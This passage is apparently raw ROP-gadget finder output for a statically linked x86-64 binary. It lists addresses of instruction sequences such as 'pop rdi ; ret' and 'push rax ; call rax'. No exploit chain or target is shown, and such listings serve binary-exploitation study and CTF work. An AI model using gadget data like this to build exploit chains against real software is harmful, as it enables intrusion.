0x0000000000435fe9 : pop rdi ; out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435e19 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435f15 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000435e61 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000408f25 : pop rdi ; pop rbp ; ret
0x00000000004006c6 : pop rdi ; ret
0x000000000049b225 : pop rdi ; stc ; jmp rax
0x000000000049b221 : pop rdi ; stc ; push rax ; pop rdi ; stc ; jmp rax
0x00000000004b84c9 : pop rdx ; add byte ptr [rax], al ; je 0x4b84cb ; stc ; jmp qword ptr [rdx]
0x00000000004b8445 : pop rdx ; add byte ptr [rax], al ; pop rax ; stc ; call qword ptr [rax]
0x0000000000431646 : pop rdx ; add eax, 0x83480000 ; ret 0x4910
0x00000000004afa61 : pop rdx ; je 0x4afa2b ; ret 0xacfc
0x00000000004b0a27 : pop rdx ; out 0xf5, eax ; mov ch, 0xab ; ret
0x0000000000452854 : pop rdx ; pop r10 ; ret
0x00000000004887d7 : pop rdx ; pop rbx ; ret
0x0000000000452879 : pop rdx ; pop rsi ; ret
0x00000000004502e5 : pop rdx ; ret
0x00000000004b0590 : pop rdx ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00000000004466de : pop rsi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000426e76 : pop rsi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000403455 : pop rsi ; clc ; lea rsp, qword ptr [rsi] ; ret
0x00000000004269ae : pop rsi ; jmp rax
0x0000000000428ed1 : pop rsi ; jmp rcx
0x0000000000451e12 : pop rsi ; mov rdi, qword ptr [r13] ; call r12
0x0000000000401895 : pop rsi ; or byte ptr [rbp + 9], cl ; fimul dword ptr [rax + 0xf] ; ret 0xc3f3
0x0000000000427b7b : pop rsi ; pop r15 ; jmp rax
0x0000000000408f23 : pop rsi ; pop r15 ; pop rbp ; ret
0x00000000004006c4 : pop rsi ; pop r15 ; ret
0x000000000041627e : pop rsi ; pop rbp ; ret
0x00000000004010dc : pop rsi ; ret
0x000000000040a91e : pop rsi ; ret 1
0x00000000004034ad : pop rsi ; sbb al, 0xab ; pop rbx ; ret 0x3956
0x0000000000444270 : pop rsp ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431944 : pop rsp ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000444f70 : pop rsp ; add eax, 0x83480000 ; ret 0xe910
0x000000000042346b : pop rsp ; and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x00000000004b7904 : pop rsp ; cdq ; stc ; call rsi
0x0000000000451172 : pop rsp ; jmp rax
0x0000000000451157 : pop rsp ; mov esi, 2 ; jmp rax
0x00000000004269aa : pop rsp ; pop r13 ; pop r14 ; jmp rax
0x0000000000428ecd : pop rsp ; pop r13 ; pop r14 ; jmp rcx
0x0000000000427b77 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x0000000000408f1f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004006c0 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000041627a : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x00000000004010d8 : pop rsp ; pop r13 ; pop r14 ; ret
0x0000000000400f60 : pop rsp ; pop r13 ; ret
0x0000000000401361 : pop rsp ; ret
0x000000000049b215 : pop rsp ; stc ; jmp qword ptr [rax]
0x0000000000416224 : popfq ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004bc789 : popfq ; add byte ptr [rax], al ; sub bh, ch ; jmp rsp
0x00000000004bc755 : popfq ; add byte ptr [rax], al ; sub byte ptr [rdx], ch ; std ; jmp qword ptr [rcx]
0x00000000004716dd : popfq ; call 0xffffffffc3cb16e7
0x000000000047141f : popfq ; idiv edi ; dec dword ptr [rax - 0x77] ; ret
0x000000000049332e : popfq ; ret 0xf45
0x000000000048e3d6 : popfq ; sub esp, dword ptr [rbx] ; add byte ptr [rax], al ; jne 0x48e3e7 ; pop rbx ; ret
0x000000000043bd42 : psllq mm1, qword ptr [r15] ; jg 0x43bd5d ; ret
0x000000000043e862 : psllq mm1, qword ptr [r15] ; jg 0x43e87d ; ret
0x0000000000403a76 : psllq mm1, qword ptr [rdi] ; jg 0x403ad9 ; adc bl, dh ; ret
0x000000000043bd43 : psllq mm1, qword ptr [rdi] ; jg 0x43bd5c ; ret
0x000000000043e863 : psllq mm1, qword ptr [rdi] ; jg 0x43e87c ; ret
0x000000000044ad56 : psllq mm1, qword ptr [rdi] ; jg 0x44ad6a ; mov dword ptr [rdi + 0xf], ecx ; ret
0x000000000044ad55 : psllq mm1, qword ptr [rdi] ; jg 0x44ad6b ; mov dword ptr [rdi + 0xf], ecx ; ret
0x000000000044adb7 : psllq mm1, qword ptr [rdi] ; jg 0x44adcc ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00000000004b9225 : push -0x5bc80000 ; cli ; call qword ptr [rax]
0x00000000004b9239 : push -0x5bcc0000 ; cli ; call qword ptr [rdx]
0x00000000004b920d : push -0x5bd00000 ; cli ; call qword ptr [rbx]
0x00000000004b4164 : push -0x67ffffe9 ; ret
0x0000000000464e32 : push -0x7c000003 ; ret
0x000000000044b674 : push -0x9ffffff ; ret 0x7501
0x000000000040a918 : push -0xcec28c ; call 0x426b87
0x000000000049d721 : push -5 ; call qword ptr [rbx]
0x000000000049d70d : push -5 ; call rdx
0x000000000049d711 : push -5 ; lcall ptr [rsi] ; insb byte ptr [rdi], dx ; sti ; call rdi
0x000000000049d71d : push -5 ; ljmp ptr [rax] ; push -5 ; call qword ptr [rbx]
0x00000000004186dd : push 0x48 ; add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000048f0b4 : push 0x4800001f ; mov dword ptr [rbx + 0x20], eax ; pop rbx ; ret
0x00000000004806e5 : push 0x48b4901 ; and al, 0x83 ; ret
0x000000000045f22c : push 0x4cffffff ; mov edi, esi ; call rdx
0x000000000049d704 : push 0x6b ; sti ; jmp qword ptr [rdx]
0x00000000004b0602 : push 0x6e ; ja 0x4b058d ; ret 0x48f
0x0000000000497a67 : push 0x7505c748 ; ret
0x000000000041de4a : push 0x75c08548 ; ret
0x00000000004035a6 : push 0x76 ; leave ; ret 0x8581
0x000000000049c03f : push qword ptr [rax + 0x23] ; cli ; jmp rax
0x000000000049c057 : push qword ptr [rax + 0x28] ; cli ; jmp rax
0x000000000049b187 : push qword ptr [rax + 0x29] ; stc ; call qword ptr [rax]
0x000000000049b91f : push qword ptr [rax + 0x40fffa0a] ; or bh, dl ; call rax
0x000000000049be17 : push qword ptr [rax + 0x40fffa31] ; xor edx, edi ; call rax
0x000000000049c247 : push qword ptr [rax + 0x40fffaa7] ; xchg eax, esp ; cli ; call rax
0x000000000049b1ff : push qword ptr [rax + 0x55] ; stc ; jmp rax
0x000000000049c1bf : push qword ptr [rax + 0x7a] ; cli ; call qword ptr [rax]
0x000000000049b60f : push qword ptr [rax - 0x2f] ; stc ; push qword ptr [rax] ; sar ecx, cl ; call qword ptr [rax]
0x000000000049c2df : push qword ptr [rax - 0x3f000511] ; out dx, eax ; cli ; jmp rax
0x000000000049c14f : push qword ptr [rax - 0x3f0005c1] ; cli ; call rax
0x000000000049b6e3 : push qword ptr [rax - 0x3f] ; stc ; inc eax ; ret 0xfff9
0x000000000049b503 : push qword ptr [rax - 0x5d] ; stc ; inc eax ; movsb byte ptr [rdi], byte ptr [rsi] ; stc ; call qword ptr [rax]
0x000000000049b517 : push qword ptr [rax - 0x6b] ; stc ; inc eax ; xchg eax, esi ; stc ; call qword ptr [rax]
0x000000000049b38b : push qword ptr [rax - 0x71] ; stc ; dec dword ptr [rax - 0x56] ; stc ; call qword ptr [rax]
0x000000000049c1df : push qword ptr [rax - 0x79] ; cli ; call qword ptr [rax]
0x000000000049b27f : push qword ptr [rax - 0x7a] ; stc ; jmp qword ptr [rax]
0x0000000000494ccd : push qword ptr [rax] ; jne 0x494d00 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000495b2d : push qword ptr [rax] ; jne 0x495b60 ; mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000049b41f : push qword ptr [rax] ; mov cl, 0xf9 ; call qword ptr [rax]
0x000000000049b6d3 : push qword ptr [rax] ; mov esp, 0xbd80fff9 ; stc ; call rax
0x000000000049b213 : push qword ptr [rax] ; pop rsp ; stc ; jmp qword ptr [rax]
0x000000000049b6bf : push qword ptr [rax] ; retf 0xfff9 ; or bl, 0xf9 ; call rax
0x000000000049b58f : push qword ptr [rax] ; sar cl, cl ; push rax ; sar ecx, cl ; call rax
0x000000000049b62f : push qword ptr [rax] ; sar ecx, 1 ; push rax ; sar cl, cl ; call rax
0x000000000049b613 : push qword ptr [rax] ; sar ecx, cl ; call qword ptr [rax]
0x000000000049b1cf : push qword ptr [rax] ; stc ; jmp qword ptr [rax + 0x10fff945]
0x000000000049bb4f : push qword ptr [rax] ; sti ; stc ; call rax
0x000000000049c1d7 : push qword ptr [rax] ; test dl, bh ; call rax
0x000000000049b5fb : push qword ptr [rax] ; xlatb ; stc ; call qword ptr [rax]
0x000000000044cff8 : push qword ptr [rbp + 0x1a] ; xor eax, eax ; ret
0x0000000000451208 : push qword ptr [rbp + 0x35] ; mov rdi, qword ptr [rbp] ; call r12
0x00000000004511e0 : push qword ptr [rbp + 0x3d] ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451e10 : push qword ptr [rbp + 0x5e] ; mov rdi, qword ptr [r13] ; call r12
0x0000000000451e40 : push qword ptr [rbp + 0x5f] ; mov rdi, qword ptr [r13] ; call r12
0x0000000000432a09 : push qword ptr [rbp + 4] ; vzeroupper ; ret
0x0000000000478538 : push qword ptr [rbp + rax + 0x5b] ; pop rbp ; pop r12 ; ret
0x000000000041dc4d : push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x000000000047855e : push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x000000000041e0b6 : push qword ptr [rbp + rcx - 0x18] ; ret 0x8a
0x0000000000485fcb : push qword ptr [rbp - 0x2e] ; ret
0x000000000041e480 : push qword ptr [rbp - 0x44] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000468053 : push qword ptr [rbp - 0x4b8] ; push rax ; call 0x4642f9
0x000000000044fffc : push qword ptr [rbx + 1] ; ret
0x00000000004657b4 : push qword ptr [rcx] ; fcmovnb st(0), st(6) ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x0000000000480dcf : push qword ptr [rcx] ; fucomi st(3) ; ret 0x1f0f
0x000000000041c22f : push qword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x000000000045bbe3 : push qword ptr [rcx] ; ror byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000450686 : push qword ptr [rdi + 0x3f] ; ret
0x00000000004503b6 : push qword ptr [rdi + 0x57] ; ret
0x00000000004502e3 : push qword ptr [rdi + 0x5a] ; ret
0x0000000000461bb2 : push qword ptr [rdi + 0xb] ; ret
0x000000000045008a : push qword ptr [rdi + 3] ; ret
0x0000000000450379 : push qword ptr [rdi + 4] ; ret
0x00000000004500d8 : push qword ptr [rdi + 5] ; ret
0x000000000047c22e : push qword ptr [rdi + 7] ; ret
0x0000000000450e55 : push qword ptr [rdi + 8] ; ret
0x000000000045044c : push qword ptr [rdi + 9] ; ret
0x000000000049b8bb : push qword ptr [rdi + rax + 0x744fffa] ; cli ; call rsp
0x000000000047c0e4 : push qword ptr [rdi + rax*2 - 0x77] ; ret 0xe283
0x000000000049b7f3 : push qword ptr [rdx + 0x42fffa08] ; or dl, bh ; call rdx
0x000000000049ba97 : push qword ptr [rdx + rax - 6] ; jmp rsp
0x000000000049d15b : push qword ptr [rdx - 5] ; call qword ptr [rax]
0x000000000049d18b : push qword ptr [rdx - 5] ; jmp rax
0x000000000049d157 : push qword ptr [rdx - 5] ; push qword ptr [rdx - 5] ; call qword ptr [rax]
0x000000000049d187 : push qword ptr [rdx - 5] ; push qword ptr [rdx - 5] ; jmp rax
0x000000000049c97f : push qword ptr [rdx] ; sti ; jmp rdx
0x000000000049bdb3 : push qword ptr [rsi + rbp + 0x2e44fffa] ; cli ; call rsp
0x0000000000417eb6 : push qword ptr [rsp + rcx - 0x18] ; ret 0xec
0x000000000041d082 : push r8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000047763a : push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x000000000041ee31 : push rax ; adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000422ebd : push rax ; adc dh, dh ; ret 0xf0f
0x000000000041d083 : push rax ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000042a3ac : push rax ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00000000004b6a4c : push rax ; add byte ptr [rax], al ; xor byte ptr [rax - 9], cl ; jmp qword ptr [rbx]
0x000000000049bb28 : push rax ; add dl, bh ; call rax
0x000000000049bb20 : push rax ; add edx, edi ; call rax
0x000000000049b177 : push rax ; and al, 0xf9 ; call qword ptr [rax]
0x000000000049be7c : push rax ; and al, 0xfa ; call rax
0x0000000000407850 : push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x000000000049c03b : push rax ; and edi, edx ; push qword ptr [rax + 0x23] ; cli ; jmp rax
0x0000000000457dcf : push rax ; call 0x454023
0x0000000000468059 : push rax ; call 0x4642f3
0x0000000000455438 : push rax ; call rbx
0x000000000049be6c : push rax ; cli ; call rax
0x000000000049c15f : push rax ; cli ; inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x0000000000477164 : push rax ; cmp byte ptr [rax + 1], cl ; ret
0x000000000049b660 : push rax ; fdivr st(1) ; jmp qword ptr [rax]
0x000000000049bbcc : push rax ; hlt ; stc ; call qword ptr [rax - 0x2f000622]
0x000000000049bbe0 : push rax ; in al, 0xf9 ; call rax
0x000000000049bba4 : push rax ; in eax, 0xf9 ; call rax
0x000000000049bbf8 : push rax ; in eax, dx ; stc ; call rax
0x000000000049c333 : push rax ; int1 ; cli ; call qword ptr [rax]
0x000000000049bbc4 : push rax ; int1 ; stc ; call rax
0x0000000000450d2c : push rax ; jo 0x450d32 ; dec dword ptr [rax - 0x77] ; ret
0x0000000000478b89 : push rax ; lea r9, qword ptr [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x000000000049b397 : push rax ; lodsd eax, dword ptr [rsi] ; stc ; call rax
0x000000000049bb9c : push rax ; loop 0x49bb9b ; call rax
0x000000000049bbd8 : push rax ; loope 0x49bbd7 ; call rax
0x000000000049b48c : push rax ; mov dh, 0xf9 ; jmp rax
0x00000000004576e1 : push rax ; mov dword ptr [rax + 0x54], edx ; ret
0x000000000041fbb2 : push rax ; or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret
0x0000000000420eda : push rax ; or byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x0000000000451b2d : push rax ; or byte ptr [rbx + 0x94801e2], al ; ret 0x8949
0x00000000004238b5 : push rax ; or byte ptr [rcx - 0xa], al ; ret 0xf04
0x0000000000453a7b : push rax ; or dh, dh ; ret 0x8902
0x00000000004245f2 : push rax ; or dh, dh ; ret 0xf02
0x000000000049b730 : push rax ; or edx, edi ; jmp rax
0x000000000049bbe8 : push rax ; out 0xf9, eax ; call rax
0x000000000049bbbc : push rax ; out dx, al ; stc ; call rax
0x0000000000488f8e : push rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000048f165 : push rax ; pop rbx ; ret
0x000000000049b223 : push rax ; pop rdi ; stc ; jmp rax
0x000000000049c1bb : push rax ; push rdi ; cli ; push qword ptr [rax + 0x7a] ; cli ; call qword ptr [rax]
0x00000000004576e3 : push rax ; push rsp ; ret
0x000000000049b6a8 : push rax ; ret 0xfff9
0x000000000049b61b : push rax ; salc ; stc ; call rax
0x000000000049b570 : push rax ; sar cl, cl ; call qword ptr [rax]
0x000000000049b633 : push rax ; sar cl, cl ; call rax
0x000000000049b593 : push rax ; sar ecx, cl ; call rax
0x000000000041ee26 : push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000478679 : push rax ; sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x000000000049b157 : push rax ; sbb edi, ecx ; call qword ptr [rax]
0x000000000049b49c : push rax ; scasb al, byte ptr [rdi] ; stc ; inc dword ptr [rax - 0x50] ; stc ; call qword ptr [rax]
0x000000000049b41c : push rax ; scasd eax, dword ptr [rdi] ; stc ; push qword ptr [rax] ; mov cl, 0xf9 ; call qword ptr [rax]
0x000000000049bc08 : push rax ; stc ; call rax
0x00000000004bc070 : push rax ; stc ; cld ; jmp qword ptr [rdx]
0x000000000049d163 : push rax ; sti ; call rax
0x000000000049b4b4 : push rax ; stosb byte ptr [rdi], al ; stc ; jmp qword ptr [rax]
0x000000000049b184 : push rax ; sub cl, bh ; push qword ptr [rax + 0x29] ; stc ; call qword ptr [rax]
0x000000000049be5c : push rax ; sub dl, bh ; call rax
0x000000000049c053 : push rax ; sub dl, bh ; push qword ptr [rax + 0x28] ; cli ; jmp rax
0x000000000049b510 : push rax ; xchg eax, ecx ; stc ; jmp qword ptr [rax]
0x000000000049bc28 : push rax ; xor dl, bh ; jmp rax
0x000000000042a101 : push rax ; xor eax, eax ; call 0x416325
0x0000000000490bea : push rbp ; add bl, ch ; add eax, 0x1489066 ; ret 0xb70f
0x0000000000493692 : push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004b7f85 : push rbp ; add byte ptr [rax], al ; sbb dh, cl ; stc ; jmp qword ptr [rax]
0x0000000000486738 : push rbp ; add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x0000000000416d7d : push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x00000000004881dc : push rbp ; or byte ptr [rcx + 0x33], cl ; add byte ptr [r8 + 9], r9b ; ret 0x840f
0x00000000004bd33e : push rbp ; ret
0x000000000049b201 : push rbp ; stc ; jmp rax
0x0000000000417466 : push rbx ; adc byte ptr [rax + 1], cl ; ret 0x2b48
0x000000000040799f : push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x00000000004865af : push rbx ; adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000048b887 : push rbx ; add al, 0xf ; mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004198c8 : push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x000000000044e1e5 : push rbx ; jb 0x44e1f5 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000478572 : push rbx ; je 0x4785d6 ; pop rbp ; pop r12 ; ret
0x00000000004785fe : push rbx ; je 0x478662 ; pop rbp ; pop r12 ; ret
0x00000000004198c4 : push rbx ; or byte ptr [rax + 0x2b], cl ; push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x0000000000451d3f : push rbx ; ret
0x00000000004afa5c : push rbx ; xchg eax, edx ; jae 0x4afa3b ; push rsi ; pop rdx ; je 0x4afa30 ; ret 0xacfc
0x00000000004254d2 : push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x000000000042180b : push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x0000000000421b87 : push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0xb277
0x00000000004521db : push rcx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004aece5 : push rcx ; call qword ptr [rsi]
0x00000000004652a6 : push rcx ; cmp byte ptr [rax + 0x39], cl ; ret
0x00000000004bb431 : push rcx ; hlt ; jmp qword ptr [rcx]
0x000000000043f19d : push rcx ; jl 0x43f1ee ; adc dword ptr [rcx - 1], edi ; ret
0x000000000043f304 : push rcx ; jl 0x43f355 ; adc dword ptr [rcx + 7], edi ; ret
0x000000000047fd61 : push rcx ; or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0x1475
0x000000000047fd33 : push rcx ; or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0xe75
0x000000000041c1cb : push rcx ; ret 0xffff
0x000000000042031d : push rcx ; sbb byte ptr [rcx + 1], cl ; ret 0x8d48
0x0000000000403a7a : push rdi ; adc bl, dh ; ret
0x000000000044b29a : push rdi ; add al, 0x48 ; lea eax, dword ptr [rdi + 5] ; ret
0x000000000043bea9 : push rdi ; add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x00000000004b8105 : push rdi ; add byte ptr [rax], al ; test r12b, r14b ; jmp qword ptr [rbx]
0x000000000047eca4 : push rdi ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044b34c : push rdi ; add eax, 0xc478d48 ; ret
0x000000000046497f : push rdi ; and byte ptr [rcx + 0x2b], cl ; push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000435ca8 : push rdi ; clc ; ret
0x0000000000435e20 : push rdi ; cld ; ret
0x0000000000436947 : push rdi ; cli ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000049c1bd : push rdi ; cli ; push qword ptr [rax + 0x7a] ; cli ; call qword ptr [rax]
0x000000000043b789 : push rdi ; cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000476995 : push rdi ; cmp byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x000000000043b709 : push rdi ; hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043b55a : push rdi ; int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000485d15 : push rdi ; jrcxz 0x485d43 ; add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0xc74
0x000000000041cf94 : push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x000000000043b5ea : push rdi ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000048b05a : push rdi ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x000000000048ee7a : push rdi ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x000000000048b061 : push rdi ; or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x00000000004214d6 : push rdi ; or dh, dh ; ret 0xf02
0x000000000044b530 : push rdi ; or eax, 0x1c478d48 ; ret
0x000000000043409e : push rdi ; ret
0x000000000043413e : push rdi ; ret 0xff3
0x000000000041fc40 : push rdi ; sbb byte ptr [rax + 0x39], cl ; ret
0x0000000000464983 : push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000436b47 : push rdi ; stc ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043636a : push rdi ; std ; mov word ptr [rdi - 2], cx ; ret
0x0000000000436747 : push rdi ; sti ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000479f6b : push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x0000000000431e58 : push rdi ; xor eax, eax ; ret
0x00000000004b7c9d : push rdx ; add byte ptr [rax], al ; loopne 0x4b7c55 ; stc ; call qword ptr [rax]
0x000000000042b29a : push rdx ; insb byte ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000049b7dc : push rdx ; or edi, edx ; jmp rdx
0x00000000004576dd : push rdx ; sbb ecx, dword ptr [rcx + 0x50895048] ; push rsp ; ret
0x000000000049bcfb : push rdx ; sub eax, 0x2d82fffa ; cli ; call qword ptr [rdx]
0x000000000049bcd4 : push rdx ; xor bh, dl ; jmp rdx
0x0000000000406f86 : push rsi ; adc byte ptr [rbp + 9], al ; fadd qword ptr [rcx - 0x77] ; ret
0x0000000000406cfa : push rsi ; adc byte ptr [rcx + 0x31], al ; ret
0x0000000000432d84 : push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000044d889 : push rsi ; add ah, byte ptr [rdx - 0xf] ; jl 0x44d8e0 ; adc dword ptr [rsi + 3], edx ; ret
0x000000000043c141 : push rsi ; add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x000000000043c1b1 : push rsi ; add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x000000000044ace5 : push rsi ; add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x000000000043c0d1 : push rsi ; add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x000000000044ac83 : push rsi ; add ecx, dword ptr [rcx + 0x357890f] ; ret
0x000000000040701e : push rsi ; and byte ptr [rbp + 9], al ; fadd qword ptr [rcx - 0x77] ; ret
0x0000000000406d7a : push rsi ; and byte ptr [rcx + 0x31], al ; ret
0x0000000000432d99 : push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000435dd2 : push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000436541 : push rsi ; cld ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000436175 : push rsi ; cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000436355 : push rsi ; cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000436535 : push rsi ; cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435f95 : push rsi ; cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004b0600 : push rsi ; cli ; push 0x6e ; ja 0x4b058f ; ret 0x48f
0x000000000044cb36 : push rsi ; cmc ; sub eax, edx ; ret
0x000000000044cb26 : push rsi ; hlt ; sub eax, edx ; ret
0x000000000044caf6 : push rsi ; int1 ; sub eax, edx ; ret
0x000000000049b778 : push rsi ; or dl, bh ; jmp rsi
0x00000000004afa60 : push rsi ; pop rdx ; je 0x4afa2c ; ret 0xacfc
0x00000000004ad9a6 : push rsi ; ret
0x000000000046fea1 : push rsi ; sbb byte ptr [rax - 0x3f], cl ; cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x0000000000464d93 : push rsi ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000044cb06 : push rsi ; sub eax, edx ; ret
0x000000000049b270 : push rsi ; xchg cl, bh ; inc dword ptr [rdx] ; xchg ecx, edi ; call rdx
0x00000000004070b6 : push rsi ; xor byte ptr [rbp + 9], al ; fadd qword ptr [rcx - 0x77] ; ret
0x0000000000406dfa : push rsi ; xor byte ptr [rcx + 0x31], al ; ret
0x0000000000432dae : push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000049ba93 : push rsp ; add bh, dl ; push qword ptr [rdx + rax - 6] ; jmp rsp
0x00000000004b7ea1 : push rsp ; add byte ptr [rax], al ; jl 0x4b7e6d ; stc ; jmp qword ptr [rdx]
0x00000000004891ba : push rsp ; and al, 0x10 ; call rdx
0x0000000000423528 : push rsp ; and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000423a85 : push rsp ; and al, 8 ; call 0x41fd25
0x00000000004b1aa3 : push rsp ; lahf ; std ; jmp qword ptr [rbx]
0x000000000049b8a4 : push rsp ; or bh, dl ; jmp rsp
0x00000000004576e4 : push rsp ; ret
0x000000000048fc5c : push rsp ; ret 0x4808
0x00000000004880e1 : push rsp ; ret 0xeb30
0x000000000049b1fd : push rsp ; stc ; push qword ptr [rax + 0x55] ; stc ; jmp rax
0x000000000049bd9c : push rsp ; xor edx, edi ; jmp rsp
0x0000000000443f30 : pushfq ; adc eax, 0x83480000 ; ret 0xe910
0x0000000000469186 : pushfq ; add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8944
0x0000000000451db7 : pushfq ; add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x451dc8 ; call r12
0x00000000004bc6b9 : pushfq ; add byte ptr [rax], al ; in al, 0x28 ; std ; jmp qword ptr [rdx]
0x0000000000458d8a : pushfq ; and al, 0xa0 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x00000000004808df : pushfq ; and al, 0xc0 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x000000000041d6bb : pushfq ; and al, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000044fcd0 : pushfq ; cmp dword ptr [rcx], eax ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x0000000000444c30 : pushfq ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000430e04 : pushfq ; or eax, 0x83480000 ; ret 0xeb10
0x0000000000407a48 : pushfq ; ret
0x0000000000493367 : pushfq ; ret 0xf45
